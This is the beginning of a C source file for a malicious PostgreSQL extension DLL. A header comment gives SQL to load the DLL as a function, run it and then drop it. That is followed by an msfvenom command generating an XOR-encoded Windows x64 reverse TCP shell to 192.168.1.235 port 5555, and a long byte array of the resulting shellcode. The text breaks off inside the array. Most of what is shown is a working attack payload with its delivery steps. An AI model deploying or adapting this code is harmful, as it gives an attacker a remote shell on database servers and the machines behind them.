/*

CREATE OR REPLACE FUNCTION shellcode() RETURNS void AS 'C:\shellcode-extension.dll','shellcode' LANGUAGE C STRICT;

SELECT shellcode();

DROP FUNCTION IF EXISTS shellcode;

*/

#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

// msfvenom -a x64 -e x64/xor_dynamic -i 2 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.1.235 LPORT=5555 -f c -v payload

unsigned char payload[] =
"\xeb\x27\x5b\x53\x5f\xb0\xe9\xfc\xae\x75\xfd\x57\x59\x53\x5e"
"\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f\x08\x83"
"\x74\x07\x80\x3e\xe9\x75\xea\xeb\xe6\xff\xe1\xe8\xd4\xff\xff"
"\xff\x5d\x03\x13\x10\x31\x2e\x03\x07\x18\x63\x49\x07\x21\xe9"
"\xb6\x24\x48\x43\x6e\x9e\xfa\xfb\xb6\x16\xb4\x50\x78\x0e\x5d"
"\x99\x16\x01\x29\x4b\xf8\xdf\x2b\xb6\xc1\x47\xdc\x3c\xd2\x47"
"\x45\x29\x83\x39\xe1\x16\xa3\xec\xc7\xa2\xe2\xfb\xc4\xce\xd1"
"\xfc\x20\x7b\x2a\x4e\x26\x7c\x65\x10\x03\x21\x1f\x2d\x04\xfe"
"\xd4\x27\x5b\x53\x5f\xb0\xb0\xfc\xae\x75\xfd\x57\x59\x6c\x5e"
"\x8a\x06\x30\x07\x73\xff\xc7\x48\xff\xc6\x66\xbe\x3f\x51\x90"
"\x74\x07\xbb\x3e\x8b\x75\xea\xeb\xe6\xc0\xe1\xe8\xd4\xff\xff"
"\xc4\x07\x61\x02\x03\x17\x19\x34\x17\x76\x71\x06\x29\xb0\xec"
"\x46\x59\x50\x48\xa9\x29\xeb\xd8\x04\xfb\x7e\x65\x32\x5c\x89"
"\x11\x29\x0c\x60\x89\xb6\x4e\xd6\xc1\x3c\x83\x3c\xf6\x2c\x7f"
"\x10\xc9\x4f\x1b\x5c\xed\x8a\xdf\xfc\xf6\xf1\xdf\xe8\x89\xb1"
"\x2f\x2e\x66\x24\x01\x3e\x0e\x12\x1c\x61\x07\x77\x24\xeb\x27"
"\x5b\x14\x5f\x9a\xc0\xfc\xae\x75\xfd\x57\x66\x53\x5e\xcd\x06"
"\x21\x3c\x48\xff\xc7\x48\xff\xc6\x59\x81\x78\xbc\x68\x74\x3c"
"\x80\x3e\xc0\x75\xea\xeb\xd9\xb8\xe1\xf9\xd4\xff\xc4\xff\x06"
"\x29\x07\x61\x8d\x7b\x06\x08\x0b\x17\x76\x4a\xc0\xed\x0e\x5c"
"\x32\x95\x8c\xd3\xe5\xa5\x62\x8b\x1d\x5f\x7a\x59\xeb\xcc\x33"
"\x2f\x51\xf4\xd0\x3e\x8e\xfb\x4f\x86\x5e\x6e\xd4\x63\x21\x8b"
"\x29\xb2\x04\xec\xf9\xe1\x9e\x2b\xeb\xc3\xe6\xcb\xe8\x07\x77"
"\x2f\x2e\x5d\x67\xc9\x05\x0e\x12\x1c\x5e\xb2\xeb\x27\x5b\x53"
"\x64\x7c\x7f\xed\xae\x75\xfd\x68\x59\x53\x5e\x8a\x06\xc7\x07"
"\x59\xff\xc7\x48\xff\xf9\x66\x81\x3f\xbe\x1e\x4f\x16\x80\x3e"
"\x7f\x75\xea\xd4\xe6\xff\xe1\x24\xd4\xd5\xff\xff\x76\x71\x06"
"\x29\x38\x61\x30\xcf\x2a\x08\x30\x29\x7f\x9d\x56\x5d\x7a\x67"
"\xd1\xbe\xff\x95\x6c\xcd\x7e\x2f\x22\x58\xa3\x01\x6e\xfb\x4b"
"\xc4\xde\x43\xed\xb0\x17\x87\x16\xe4\xf6\xb7\x04\xbb\x27\x49"
"\x5c\xa7\x9a\xe0\xd6\xe6\x89\x28\xc3\xc4\xe6\x04\x08\x63\x50"
"\x10\x28\x05\x60\xea\x38\x0f\x5b\xef\x2f\x38\x38\x74\x98\xc2"
"\x9c\x44\x4d\xcd\x7e\x73\x6f\x32\xed\x01\x20\x01\x3f\x38\xcf"
"\x7c\xc7\xe7\x55\xe1\x4f\x54\x12\x5e\x5d\x77\x32\xdd\x79\xfb"
"\xeb\x91\x8c\xe6\xd7\xe8\xae\x0c\xdd\x34\x15\x1c\x2a\x4a\x66"
"\x17\x19\x03\x4f\xf3\xd1\xd0\x3e\x50\x7a\x29\xfe\x11\xd5\xa9"
"\x14\x01\x6f\x62\x4a\x55\xa3\x70\x7d\x3e\x61\xf8\xa6\xb4\xfc"
"\xc6\x7f\x8a\x16\x9a\xf1\x72\x11\x87\x5f\xd7\x76\xd1\xc9\xed"
"\xea\x97\x99\xd2\xd6\xc7\x9e\xfe\x02\x2d\x1e\x07\x26\x71\x64"
"\x1c\x3f\x06\x75\x15\x25\x76\x71\x5f\xad\x9b\x98\xb2\x4a\xfb"
"\x34\x9b\x46\x5e\x98\x02\x1e\x5f\x23\xef\xef\x4d\x9f\x2c\x61"
"\xb1\x29\x11\xa5\x18\x5b\x87\x15\xec\x02\x2d\xe3\xed\xe1\xff"
"\xdb\xb4\x8f\xc0\xd7\x16\x51\xf0\x0b\x29\x29\x07\x3e\x75\x72"
"\x11\xee\xd0\x46\xaf\x50\x64\xa9\x8e\xd5\xd8\x04\xfb\x42\x65"
"\x3a\xa2\x89\x3d\x29\x0c\x5e\x89\xb6\x72\xd6\xc9\x3c\x7d\x3c"
"\x41\x3b\x7f\x2e\xc9\x73\xbc\x54\xed\x8a\x21\xfc\xda\xf1\xdf"
"\xd6\xb5\xb1\x2f\x0f\x27\x20\xba\x3a\x3d\x0f\x0c\x32\x71\xc3"
"\xf3\x28\x7c\x73\xe5\xb1\xea\xf3\x9e\x7b\x84\x07\x79\x65\x18"
"\xad\xf8\x35\x2a\x51\xd3\xe1\x1f\xa8\xe0\x0e\xff\x5c\x69\xb5"
"\x74\x39\xbf\x36\xbc\x24\xad\x84\xe3\xa7\x0b\xd0\xc8\xe9\xd5"
"\xcb\x47\x32\x42\x0b\x0f\x51\xf0\x2a\x3c\x18\xc1\xf3\x29\x6e"
"\x77\x7e\x87\xb9\x29\x95\x4f\xd3\x7e\x33\x43\x18\xac\x31\x02"
"\x49\x9b\xcc\xe7\x73\x95\xa7\x34\xfe\x1a\xa7\x8a\x0b\xd8\xa7"
"\x05\x82\x1e\xc9\x95\x89\xe2\xc5\xe2\x96\x05\xd2\xa3\x59\x30"
"\x07\x51\x59\x0f\x04\x33\x6f\xf2\xa1\x96\x3c\x56\x53\x12\xc8"
"\x69\xf4\x8f\x0f\x40\x12\x60\x4c\x43\xb6\x68\x4e\x20\x47\xd8"
"\xe7\xc9\xfe\xfb\x47\xb1\x31\x68\x70\x54\x0e\xc6\x19\x9e\x65"
"\xc7\xc9\xca\xd9\xb6\xbf\xcd\x97\xbe\xb2\xf4\x33\x33\x30\x0c"
"\x28\x41\x53\x52\x5e\x65\x82\xeb\x6b\x41\x7a\xba\xd5\xa8\xa5"
"\x15\xd8\x4f\x26\x9a\x72\x9e\x2f\x24\x35\x5f\xc6\xe5\x6f\xe0"
"\xab\x9d\x9c\x27\x9e\x48\x29\x11\xfb\x30\xfc\x69\xbd\x25\xff"
"\xc2\xd6\x84\xb3\xbe\x80\xcf\x01\x37\x75\xf3\x13\x35\x5e\x4b"
"\x03\x41\x86\xd6\x07\x53\x13\xa4\x93\xb6\xa3\xa7\x5a\x9d\x33"
"\x43\x75\x59\xcd\xda\x72\x7a\x6c\xf2\xd6\x05\xa9\xee\x55\xa0"
"\x7e\x8d\xdc\x4d\x36\xa2\x2c\x83\x0b\xcd\xe4\xfa\xdf\x5b\xc7"
"\xe9\xf0\xee\xce\x71\x4b\x31\x10\x53\x12\xf0\x24\x04\x2c\xdf"
"\xc5\x54\x1d\x6c\x0c\xd1\xee\x3d\xb3\x7b\xcb\x48\x40\x1a\x0b"
"\xed\x67\x35\x68\xac\xf4\xc0\x4f\xcc\xf2\x10\xbf\x40\x28\x79"
"\x0b\xdb\xb5\x28\x80\x78\xed\xdc\xd9\xf5\xf9\xe2\x9f\x3d\xc8"
"\xc5\x10\x29\x4c\x20\x75\x14\x20\x1b\x25\x50\xdd\x38\x46\x32"
"\x36\xd0\xbb\xf4\xdf\x6f\xa0\xa6\x6a\x48\x01\xd2\x06\x01\x41"
"\x57\xd3\xd1\x0e\x1b\xe3\x06\x97\x35\x35\xb8\x2e\x28\xa1\x18"
"\x9d\xea\x9c\x8d\xea\xcc\xde\xaa\xbf\xf9\xa7\xdf\x7e\x96\x6e"
"\x27\x10\x12\x2b\x1d\x6e\xd6\xf5\x19\x40\xc9\x50\x8d\xa9\xc2"
"\xa8\x17\xbc\x6e\x50\x35\x77\x1c\x0b\x13\x2d\x40\xc8\x89\x24"
"\xf9\xc8\x1c\xea\xcb\x6d\x8b\x5b\x1a\x8c\x26\xa6\x32\x8d\xe0"
"\xb2\x0e\xc8\xed\x91\xf5\xfe\x96\x36\x41\x2d\x1b\x56\x97\x1d"
"\x38\x28\xd4\xe4\x11\x55\x4d\x39\xa2\x40\x2b\x89\x61\xc5\x7c"
"\x38\x20\x26\xae\x2e\x32\x41\xb4\xdb\xee\x21\xb4\xba\x27\xd3"
"\x01\x78\x04\x13\x8c\xb7\x3c\x7d\x3f\xf4\xb4\x81\xc3\xbf\xcb"
"\x9e\x12\xd3\x92\x7d\x1d\x10\x22\x5a\x01\x1c\x2d\x68\xe9\x8a"
"\x7a\x26\x5e\x53\xf3\x67\xee\xb7\x55\x87\x9d\x12\x6a\x49\x99"
"\x1c\x41\x70\x76\xa3\xc0\x66\x45\xf0\x55\x86\x0c\x7b\x39\x24"
"\x07\x87\x78\x16\x85\xff\xe2\xbd\xca\xfc\x9f\x8d\xe2\x9f\xa8"
"\x5b\x07\x06\x35\x1a\x2a\x09\x57\x43\x70\xef\xb7\x2f\x8c\x7c"
"\x82\x09\xf6\xab\x75\x4b\x0e\x4f\x50\x1c\x62\x33\x06\x6f\xe5"
"\xc3\xc7\x4e\xec\xdd\x48\xec\xbc\x94\x76\x6f\x17\xf7\x27\x49"
"\x57\x83\x59\xaa\x15\xeb\xe0\xf3\xb3\xa9\xf3\xca\x55\x31\x18"
"\x67\xce\x9d\x07\x33\xfd\xce\x3c\x13\x47\x59\xbb\xfd\x60\x30"
"\x14\xc7\x79\x66\x3d\x04\x3f\x51\x89\x7b\xdf\x94\xa2\x60\xe4"
"\x7e\x6f\x40\x2f\x74\x90\x23\xba\xd5\x86\x6b\xce\xe9\xc8\x84"
"\xe0\xe0\xd7\x4c\x14\x70\xd9\x62\x02\x1e\x48\x72\xa1\x5c\xd6"
"\x0c\x4d\x18\x7f\x5b\x7f\x19\x9a\x3d\x91\x72\x88\x2c\x8e\x54"
"\xf3\xfd\x93\x3c\x3a\x1c\x8f\xb7\x4e\x34\x44\xda\xaa\x5b\x71"
"\x49\x3b\x26\x7a\x7d\x04\x1d\x72\xee\xc6\xe8\xd8\x73\xad\x64"
"\xef\x80\x2c\x45\x46\x18\x97\x54\xb1\x5f\xd2\xb1\x3f\xe4\x42"
"\x9e\x07\x21\xf8\xc7\x38\x33\x23\x3e\xc2\x1b\x37\x42\x9f\xb6"
"\x6b\xa9\x92\xe4\xe1\x2f\x40\x7d\x09\x14\xa9\x41\xf2\x88\xbf"
"\x3b\x65\xa9\xcb\xfb\xe1\x27\x6b\xab\x8c\x87\xce\x34\x4c\x62"
"\x9e\xd9\xb6\x7d\xd6\xfe\xe8\x31\x50\x7a\x79\x57\x70\xa1\xa2"
"\x5d\x4b\xd0\xfa\x12\xfc\x84\x16\x57\x26\xc6\x8d\x6f\xc4\x49"
"\xc9\x39\xa6\x86\x24\x12\xf2\x2f\x5c\x41\xc5\xc6\xfa\xcc\xc0"
"\x45\xf7\x36\x9d\x4f\xf5\x9f\xef\x24\x87\x4e\xa7\x99\x06\x09"
"\x2f\xce\x3e\xab\xc5\x42\x9f\x7a\xef\x84\x62\xe7\xdc\xa9\xca"
"\x0c\x21\x3c\x14\x03\x5b\x9e\xa8\xb5\xca\x9a\x66\xce\xd5\x63"
"\xfb\x23\xcb\xe7\x2f\x60\x66\x5a\xca\x3c\x5d\x4c\xf3\xef\xa4"
"\x4c\x94\x5a\xa5\x68\xbb\x49\xb6\x8c\x7d\x6f\xd5\xa7\x7f\x8a"
"\x59\x7c\x6d\x81\x48\x29\x16\x2c\xcc\xd8\x6f\xe4\x23\x3e\x32"
"\xa0\x3a\x9a\x60\xa1\xe8\x6c\xd2\x40\x6a\xa0\xc6\x27\x7c\x16"
"\x63\x5a\xc5\xed\xc6\x30\xd1\x95\xae\xd5\x26\x63\xa5\x4a\x92"
"\x30\x33\x5b\x22\x87\xae\xfa\xc8\xd6\x45\xec\xcf\x46\xc1\x14"
"\x31\x71\xf3\x10\xe2\x3c\x13\x36\x35\xe9\xd6\x65\x21\x3a\xf6"
"\x39\x7d\x1e\x19\xac\xfa\xa4\xc2\x23\xd6\x68\xd4\x03\x53\xd7"
"\xc7\xa1\xd8\xa7\xfa\xa2\x91\xe8\x9d\x76\xa0\x28\x01\xfb\xb0"
"\x40\x63\x99\x62\xfc\x32\xaa\x74\xcf\x50\x49\xbd\x67\x5e\xdf"
"\x3f\xbf\x1f\x9e\x40\x64\x2b\xcb\xf6\xe5\xc9\x72\x5f\x9b\xd8"
"\x66\x2b\xc5\x63\x44\xd4\x5b\xf6\x09\xe1\x0c\xfa\xa6\x6f\x97"
"\x84\x76\x88\xa8\x08\x6e\x12\x07\xdf\xb0\x8d\x57\x5e\xe3\x4d"
"\xfc\xe7\x16\x4e\x81\x9f\x69\xd4\xb8\x2b\x36\x1b\x51\xe4\x13"
"\x6c\xe8\xa0\x0f\x5c\x8c\x4b\xec\xcf\x38\xad\x46\x07\x8d\xe7"
"\x0e\x7e\x6a\xf3\x82\xee\x7f\xb5\xcc\xef\x61\x8c\x4e\xb0\xa1"
"\x32\x4a\xea\xa7\x3f\xc4\x47\x6a\xb7\x94\x61\x61\x6a\x11\xc6"
"\xbc\x16\xde\x33\x3a\x01\x9e\x54\xe4\x53\xb4\x84\x35\xee\x45"
"\xc8\x76\xda\x70\x33\x3a\xb5\x12\xa1\xfb\xda\x01\xe8\x8b\xf7"
"\x81\x39\x65\xdd\x1e\xb5\x2d\x19\x51\x24\x0e\xff\xdb\xdb\xa0"
"\x2f\xc1\x16\x65\xd1\x0c\x6d\x0f\xc4\x13\x96\x5d\x01\x0b\x28"
"\xf2\xfc\x39\x45\x3a\xec\x51\x2e\x34\xec\x61\xcf\x95\x93\x42"
"\x17\x45\xb9\x4b\x4c\xeb\xfe\xb5\xcb\xff\xa4\x92\xa0\xb2\xc6"
"\x60\x9e\x0f\x2e\xce\x1e\x5a\x4a\xb1\xef\xe3\xf4\xdc\xb6\x44"
"\xd4\x3f\xea\x54\x82\x08\x41\x98\x4d\x3c\x43\xe4\xd1\x94\x72"
"\x2a\x01\x90\x9f\x3b\xa8\xdd\xbf\x47\x56\xf3\xc0\x34\xa7\x3b"
"\xc1\x30\xee\xbf\x17\x10\xb7\x5d\xf2\xf1\x2f\x9f\xe3\x1d\x52"
"\x84\xe0\x99\xe3\xd1\xc5\x44\x9f\x2f\xf6\xbc\xf7\xdb\x98\x11"
"\x66\x23\xd0\xef\x5f\x28\xd8\x15\x8f\x4c\x98\xe2\x8c\x4a\x10"
"\x13\xed\x0f\xcb\x55\xe7\x0f\x23\x2b\xd5\x83\xdb\x7b\x75\x6f"
"\x9b\x47\x9e\x1c\x18\x7f\x36\x73\x41\xd6\xae\x1d\xcd\x41\x08"
"\xfc\xb0\x4d\xf6\x36\x30\x8b\x28\x54\x42\xa4\x85\x9c\x65\xc1"
"\x6c\xd7\x24\xfd\xd6\x36\xeb\x1e\xb6\xa1\xd9\xf5\xd8\xfc\xc9"
"\xc8\xfa\x57\x8a\xad\xec\x51\xce\xad\x8e\x57\x8d\xde\xbd\x20"
"\x6e\xdc\x4a\x45\x18\x5e\xb1\x0e\xce\x87\x78\x2c\xd5\xee\xa0"
"\x71\x97\xd1\xc1\xfa\x0c\x0f\xce\xa5\x80\xf5\x03\x14\x94\x2e"
"\x07\x20\x51\xf7\xf5\xa2\xd3\xc5\xd3\x06\x58\xd9\x83\xc8\x2c"
"\x15\x54\x46\xae\x74\x51\x76\xf8\x01\x04\xa3\x59\xea\xbc\xb4"
"\xe6\x07\x46\x06\xc9\x68\x99\x5d\x9a\x54\xdb\x82\x63\x4b\xc9"
"\xd2\x6b\xae\x5e\x72\x51\xb9\xfd\x68\xff\x28\x3a\xd3\x5c\x7a"
"\xcc\xd8\xec\x41\xc0\x2b\x0e\x83\x60\x5e\xcb\x4f\x73\x4e\xd2"
"\xcc\x56\xd2\xf7\x92\xbf\xbf\x5f\x4f\x49\x31\x48\xac\x49\x1d"
"\xd0\x92\x49\x9d\xf0\xf8\xfd\x40\x81\x34\x46\x73\x58\x55\xa0"
"\x4e\x67\xcb\x5e\xa3\x4f\x89\xac\xa3\xef\x69\xca\x1d\xa2\xa9"
"\x05\x5f\x41\x6b\xb4\x5c\xfc\x21\xd3\xe7\xa1\x72\x83\x25\xa9"
"\xed\x5c\xa9\x76\x78\x39\x53\xc4\x65\x18\xdd\xe7\x43\xe0\x17"
"\x8f\x06\xe8\x25\xe8\x51\xe2\x79\x25\x75\x88\x8c\x59\x21\x6c"
"\x9e\x20\xba\xca\xf5\x27\x36\x18\xf6\x2c\x7f\xf4\x14\xd1\xfc"
"\xeb\xde\x8c\xcd\x84\x2a\xc5\xd0\x37\xfa\xf2\x3d\x19\x5d\x15"
"\xcb\xaf\xb1\xe6\xd3\x01\x35\x09\x9e\x3c\x58\x69\x9d\xbf\xdd"
"\x6b\xc9\xf4\xa3\x34\xd6\x54\x8a\x5f\x70\xe4\xce\x67\x0e\x21"
"\xda\x90\x33\xe8\x4c\x64\x4b\x73\x88\x04\x09\x27\x2e\x71\x72"
"\x53\x40\x48\xff\x4c\xc8\x12\x2c\xd4\x8c\x8c\x78\x76\x25\x7e"
"\x78\xe3\x60\x58\xb7\x92\xe9\x37\xd7\xf1\xdf\x99\x74\xb1\x91"
"\x6e\xa3\x72\xb3\x90\xb2\x5d\x65\xa6\x4e\x14\x92\x67\xad\xb2"
"\x23\x10\xcc\xbb\x9b\xcd\xeb\x48\x2c\xb1\x22\x3c\xf9\xab\xb2"
"\xec\x2b\xf0\xe8\x12\xc2\xbf\x1d\xb6\x44\xee\x86\x1b\x49\x6f"
"\xeb\xff\x25\xdf\x9a\xbe\xf6\x2a\x4a\x76\x68\x91\x1f\x07\x06"
"\xd5\xe7\x3b\xa1\xd2\x04\xe6\x8f\x99\xfd\x87\x0c\xba\x74\xea"
"\xc0\xa8\x93\x19\x57\xcd\x58\x57\x44\x91\xb1\x88\x64\xaf\xd0"
"\xdd\x5f\x1c\x94\x9f\x45\xee\xd5\xf3\x2d\x63\xd5\xc1\x83\xe5"
"\x8b\x25\x76\x8d\xea\x4e\x80\xb1\x5e\x5d\x55\xc2\x1b\xe8\x74"
"\x5c\xab\x63\x34\xa9\xd9\x09\x0f\xea\x1c\x4d\xb7\xed\xee\xfe"
"\x30\xdd\x31\x74\x77\x7b\xdc\x6b\xdb\x97\x3a\xc1\xb1\x4f\x07"
"\xbd\xc0\xc5\x65\xe4\x18\xd0\xdf\x2f\x67\x8c\x33\x71\x65\xdf"
"\xff\x60\xe7\x5f\xd4\x92\xf3\x3d\x66\x50\x2c\x6b\x82\x75\x69"
"\xa5\xac\x15\xec\xc4\xf4\xd0\x6f\x80\x22\x82\x0e\x73\x3e\xdc"
"\x4d\xad\xd6\x75\xb6\x49\xde\xd6\xbf\x8e\x09\xf8\x0e\x89\xa2"
"\x23\x73\x5f\x4a\x49\x5f\x86\x36\x03\xf7\x7b\x28\x5e\xf6\x7b"
"\xe9\x1b\xe5\xaa\xe0\x05\x7b\x8f\xe9\x53\x36\x7f\x25\x2e\xec"
"\x14\x9e\x43\xab\xa9\x81\x26\xe5\x3c\xb3\xb7\x9b\x43\x1e\x6e"
"\xb6\x5a\xe9\xd7\x54\x76\x3c\x17\x49\xc4\x46\x72\x04\xbf\x05"
"\x93\xca\x1b\x77\xe8\x3d\x50\xde\x40\x44\x93\xd5\x67\x30\xe7"
"\x7f\x25\x93\x66\x30\x10\x7a\x42\x18\x4d\x11\xa9\xa4\x7f\xae"
"\xda\x3d\xe5\xfa\x77\xe2\x48\x9e\x50\x44\x1a\x7a\x09\x44\x94"
"\x8b\xe9\x62\x77\xea\xcf\xc6\xe4\x08\x7b\xdd\xa8\x3f\xf0\xa0"
"\x29\x10\x29\x43\xc2\x19\x3a\xfa\xda\x01\x77\xa1\x44\xa1\xf1"
"\x18\xaf\x0e\xa8\xe8\xd8\x1a\x49\x67\xdc\xab\xf0\x65\xce\xd8"
"\x8c\x44\x9b\xa9\x52\xb7\x68\x63\x7d\x78\x4c\x36\x87\xae\xc9"
"\x29\xac\x54\xce\xeb\xf7\xfb\x09\x30\xff\xfd\x64\x1f\x4b\x66"
"\x98\x20\x4c\x95\x2b\x4a\x14\xc9\x9b\x1f\x60\xff\xac\xba\xcf"
"\xcd\xdc\x03\xc9\xbd\x01\x54\xd4\xe6\x08\x59\xf7\x5d\x51\xc2"
"\xda\x56\x9f\xa8\x1c\x8b\x70\x38\x6e\x20\x69\x6c\xb1\x1b\x53"
"\xca\xbb\x5e\xcb\x48\x92\x96\x37\xf4\x4e\xce\xda\x14\x3d\x62"
"\x4e\xbd\x6c\x58\xf5\x82\xcd\xa7\x96\x26\xb0\x17\x2d\xb0\xd4"
"\x36\x36\x34\xbc\x18\x94\x83\x2f\x79\xdd\x49\x6d\x51\x5d\x05"
"\x75\x75\x28\x06\x18\x74\xf7\x81\x74\x5a\xfd\x38\x4c\xb7\x45"
"\xff\x18\x9b\x20\x17\xd0\x12\xca\xa3\x75\xb2\x4e\xb2\x45\x51"
"\x24\x08\x48\xc4\xd8\xfd\x7b\xab\x7a\xe5\x09\xd0\x24\x5c\x27"
"\xce\x5e\x26\x42\xa4\x0b\xf7\xa5\x67\xa5\xfc\x62\xf4\x94\x15"
"\x1d\xd5\x2f\xe6\xcd\x52\xe6\x28\xf8\x6b\xeb\x39\xd0\xb3\xcd"
"\xad\x41\x3d\x6c\xbb\xa2\x2a\x11\xb9\xf8\xb7\x61\xde\x82\x17"
"\x48\x9c\x8f\xe3\x82\x08\xfb\x02\x9c\x8e\x9a\x85\x2b\x57\xc2"
"\x7d\x70\x3a\xdc\xef\xcb\x52\xe9\x8a\xc5\x7d\x36\x85\x66\x37"
"\x8b\xa0\xfe\x24\x7e\xcc\xe1\x96\xee\xf1\x67\x15\xbf\x0b\x8a"
"\x18\xcb\x79\xb9\xf5\xf6\x90\x1f\x74\x61\x15\x54\x02\x7a\x80"
"\x95\x76\xf1\xaf\x90\x28\xd2\x6a\x67\x42\xac\xbd\xbc\x28\x42"
"\x4f\x61\x8f\xe1\x8b\x60\xb4\x7a\x71\xe1\xaf\x8d\x65\xc8\xc4"
"\x1d\x0f\xf0\x57\x97\x65\x9b\x8e\x56\x70\xb9\x11\xcc\x71\x6d"
"\xa9\xe5\xcd\x5f\x51\x0c\x7f\x84\xb6\xef\x2d\x77\x17\x5e\x77"
"\xb3\x30\x66\x36\x9a\xdb\xec\x3b\xe5\xd5\x79\x63\x44\xb0\x46"
"\xd4\xc7\xb0\x2e\xb6\xb4\x7b\x9d\xff\x68\x23\xba\xfd\xb9\xdb"
"\xfc\xfa\x83\x3b\xd9\xe7\xb2\x35\x27\x88\x40\x1c\x84\xd5\xd6"
"\xa1\xaa\xb5\x83\x41\x32\xe6\x14\xbd\x5e\x50\x70\x3a\x42\xfa"
"\xe9\xad\xc3\xd0\xf6\xfe\x6d\xce\x80\x23\x76\x2c\x4b\x4d\x6d"
"\xdd\xd4\x35\xac\x14\xd8\x24\xac\xf6\xef\xc1\xf3\x71\x16\x0b"
"\xda\x5c\x49\x17\x7e\xda\xa1\x07\x7a\x59\x3d\x5d\x28\x61\x10"
"\x2a\x55\x76\x8c\x98\xe0\x6d\xf0\x3e\xe5\x1b\x39\x5a\x41\x8e"
"\xd9\x0f\xdc\xdd\xb7\xf5\xc3\x82\x5d\x25\x86\x2d\x77\x0c\x9d"
"\x0b\x63\x48\xc0\x1d\x56\x5d\x10\xeb\x47\xb1\x23\x5b\xe3\x82"
"\x2b\xc0\x42\xa4\xbd\x4e\x73\xba\x77\xfe\xe6\x86\xc8\x14\x81"
"\xdd\x93\x1d\xd2\x73\x54\xe8\x37\xc3\xb4\xfd\x38\x01\x5a\xc5"
"\x4a\x71\x64\x33\x14\xa5\x48\x99\xfc\x9b\xaf\xe4\x43\x10\x25"
"\xab\xf7\xc4\x70\x13\x9e\xd5\xf9\x6f\xe1\xaa\xff\xae\xee\x87"
"\x60\x39\x66\x85\x91\x47\xc1\x04\x22\x04\x7f\x75\xab\x86\x9a"
"\x12\x2e\xdc\xf6\x5e\xae\xaa\x2a\x5b\x14\xfe\xff\x3f\xfd\x53"
"\x8f\x6e\x9c\xbb\x0b\xa0\xe3\x40\x38\x46\x21\x92\xa1\xdb\xe1"
"\x64\xf9\x20\xed\x3c\xe1\x89\xbe\xf5\x42\x59\xf3\xeb\x71\xd5"
"\x68\xef\xac\xcc\x09\x47\x58\x0b\x4b\x9f\x4a\x58\xae\xbe\x20"
"\xd4\xd5\xde\xd2\x71\x9b\x3a\x86\x86\x63\x29\xc7\x54\xbc\xea"
"\x69\x86\x4f\xfa\xf8\x81\x9b\x1a\xfb\x07\xb5\xc7\xf6\x2f\xb5"
"\x79\xa6\xf3\x01\x67\x9b\x79\xc9\xf5\x63\x6b\x5a\xc6\x0e\xea"
"\x02\x10\x66\x1e\x4c\x45\xec\x1b\x0c\xba\x7a\x02\xb7\x63\x21"
"\x91\x1e\x56\x5c\x3e\x50\xdd\x08\x02\xed\xee\x6a\x27\xa1\xca"
"\x94\x51\x2d\x7a\x2a\xdd\x1e\x2d\xff\xbf\xde\xce\xcc\xd4\x48"
"\xe0\x46\x1a\x6e\xe3\xac\x82\x9d\x7c\x01\x4b\x77\x82\xb1\xc0"
"\x17\xe2\x98\x4e\xc9\xbe\x9e\xc6\x52\xff\x6a\xd7\xf6\x92\xb1"
"\x5e\x93\x47\x2d\x1d\xbe\xce\x2a\xbf\xf3\x43\x0f\x40\x53\x71"
"\x93\x53\xa6\x43\x72\x9c\xd5\xb5\x31\x35\x8c\xd5\x93\x50\xf0"
"\xc9\x18\x89\x65\xe7\x33\x83\xb6\x6c\xc6\x5b\xec\x34\x28\x4c"
"\x4c\x6f\x4b\x05\xd6\xc8\xab\x01\x28\xca\x05\xd4\xe4\x32\x1c"
"\x6a\xd3\xe1\xad\x76\x2b\xa9\x74\x2b\x4f\x78\x37\xe5\x87\x1f"
"\x54\x23\xb8\x9a\x4d\x04\x45\x53\x59\xa2\xd8\x43\x78\x6f\x15"
"\xa3\x8d\x44\xf8\xaf\x44\xaa\xe6\x7c\x28\x0f\x69\xa3\x13\x2a"
"\x52\xa2\xf7\xb5\xb2\x95\x78\x1f\xf6\x3a\x4f\x40\x0b\x9f\x36"
"\xb7\x88\x8a\x88\xb2\x6b\x37\x96\xd3\x9b\x5b\xaa\x4f\x6d\x5d"
"\x54\x87\x1c\xa6\x26\x6a\xfc\x74\x7e\xe6\x81\x64\xf9\xf6\x6e"
"\xc8\x83\x8c\x52\xc5\x11\xb1\xb0\x05\xcf\xa0\x56\xab\x95\x25"
"\xc8\x89\x95\x77\xd8\x7d\xb0\x3a\xa6\x48\x0f\x70\x91\x09\x65"
"\x0c\xec\x75\xff\x52\x4e\x6a\xab\xef\x50\x2c\xee\x8b\x6b\x7c"
"\x4e\xec\xcc\xb3\x9a\xa7\x86\xaa\x4f\x8f\x64\xee\x82\xd1\x3e"
"\xd6\x6d\xbf\x4d\x70\xfd\x05\x6e\xef\xcb\xad\x75\x14\x60\x20"
"\xd3\xc6\x4b\x48\x60\x52\x46\x35\x2d\x68\xc2\x21\xe1\xbf\x82"
"\x72\xae\x49\x4f\x74\x69\x60\x5f\x97\x9e\xa3\x6b\x1d\xf2\xbc"
"\xa5\x98\xea\x09\x43\x01\x7e\x49\xca\xe9\x2d\xdb\x19\x3f\x2c"
"\xa6\x15\xf9\xc8\x48\xd1\xea\x8a\xc9\x7c\x81\xc6\xc0\x52\xb8"
"\x65\xf0\x15\x07\x9c\x7d\x52\xb6\xd9\xce\x59\x82\x89\x17\xae"
"\x36\xd6\xa1\xd9\x22\xbe\x68\xa3\x1d\x5f\x0c\x6d\x3e\x9f\xd6"
"\x76\xdb\xf3\x95\x65\xc4\x89\x53\x89\x64\xb3\x64\x5c\xfe\x6e"
"\xd6\xf3\x31\x64\x17\x94\x52\x06\x24\xe6\xbb\x2b\x5f\x8a\x6b"
"\x98\x4c\xe5\x4f\x26\x7b\xcb\x21\x49\x1e\x60\xd3\x58\xba\x6a"
"\x77\x89\x44\x67\xfa\x71\x66\x8a\x2c\x74\xda\xa8\x30\xda\xb7"
"\x5e\xa6\x20\xb3\xed\x5f\x84\x69\xb8\xce\x53\xfe\x61\x30\x2c"
"\x27\x11\x6e\xe7\xbd\x8b\xfd\x22\xe3\x0e\x8c\xd3\x5b\x73\x9f"
"\xf9\x80\xb5\xbf\xb0\xf3\xfa\xa1\x33\x40\x25\x4d\xb8\x41\x10"
"\xc4\xdc\x8f\xaf\x23\x73\x85\x7d\x4b\x86\x36\xf4\xa0\x5c\xf1"
"\x7a\x21\x46\xc6\x4e\x4a\x34\x69\x44\x83\x94\x25\x28\x7c\x78"
"\x30\x77\x02\x6d\xec\x33\xb9\xd0\x72\x2a\xa6\x91\x05\x21\x42"
